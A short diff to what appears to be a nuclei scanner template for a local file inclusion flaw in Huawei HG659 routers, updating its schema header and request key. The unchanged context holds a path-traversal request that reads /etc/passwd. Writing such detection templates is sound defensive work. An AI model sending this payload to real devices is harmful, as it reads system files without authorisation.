@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: huawei-hg659-lfi
 
 info:
@@ -8,7 +9,7 @@ info:
     - https://twitter.com/sec715/status/1406782172443287559
   tags: lfi,huawei
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/lib///....//....//....//....//....//....//....//....//etc//passwd"
